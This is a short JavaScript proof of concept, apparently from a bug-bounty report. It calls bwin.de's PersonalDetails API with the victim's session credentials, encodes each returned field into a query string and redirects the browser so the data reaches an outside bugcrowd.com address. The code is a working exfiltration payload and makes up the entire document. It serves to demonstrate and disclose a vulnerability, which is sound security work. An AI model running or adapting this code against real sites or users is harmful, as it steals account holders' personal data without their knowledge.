fetch("https://www.bwin.de/de/mobileportal/api/PersonalDetails", {
  credentials: "include",
})
  .then((res) => res.json())
  .then((response) => {
    const data = response.data;
    const queryParams = data
      .map(
        (item) =>
          `${encodeURIComponent(item.name)}=${encodeURIComponent(item.value || "")}`,
      )
      .join("&");
    window.location = `//bugcrowd.com/404.poc${queryParams}`;
  });
